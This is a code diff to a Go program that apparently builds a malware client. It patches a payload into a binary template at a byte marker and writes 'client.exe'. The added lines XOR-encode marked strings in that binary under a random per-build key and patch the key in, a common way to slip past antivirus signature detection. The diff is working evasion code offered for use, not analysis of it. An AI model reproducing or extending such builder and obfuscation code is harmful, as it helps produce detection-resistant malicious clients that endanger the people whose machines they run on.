@@ -9,7 +9,9 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"os"
+	"time"
 )
 
 const (
@@ -123,6 +125,55 @@ func main() {
 	patchedData := make([]byte, len(data))
 	copy(patchedData, data)
 	copy(patchedData[targetIndex+len(marker):], finalPayload)
+
+	// --- Obfuscation logic ---
+	rand.Seed(time.Now().UnixNano())
+	xorKey := byte(rand.Intn(254) + 1) // 1-255
+
+	// Patch XOR Key
+	xorKeyMarker := []byte{0xAA, 0xBB, 0xCC, 0xDD}
+	keyIdx := bytes.Index(patchedData, xorKeyMarker)
+	if keyIdx != -1 {
+		patchedData[keyIdx+4] = xorKey
+		fmt.Printf("[+] Patched XOR key: 0x%02X\n", xorKey)
+	}
+
+	// Patch strings
+	xorMarker := []byte{0xFE, 0xED, 0xFA, 0xCE}
+	processedMarker := []byte{0xCE, 0xFA, 0xED, 0xFE}
+
+	count := 0
+	offset = 0
+	for {
+		idx := bytes.Index(patchedData[offset:], xorMarker)
+		if idx == -1 {
+			break
+		}
+
+		absIdx := offset + idx
+		copy(patchedData[absIdx:absIdx+4], processedMarker)
+
+		// Determine string length (up to 1024 or null terminator)
+		strStart := absIdx + 5
+		strLen := 0
+		for i := 0; i < 1024 && strStart+i < len(patchedData); i++ {
+			if patchedData[strStart+i] == 0 {
+				break
+			}
+			strLen++
+		}
+
+		patchedData[absIdx+4] = byte(strLen)
+
+		// XOR the string
+		for i := 0; i < strLen; i++ {
+			patchedData[strStart+i] ^= xorKey
+		}
+
+		count++
+		offset = absIdx + 4
+	}
+	fmt.Printf("[+] Obfuscated %d strings\n", count)
 
 	err = ioutil.WriteFile("client.exe", patchedData, 0755)
 	if err != nil {
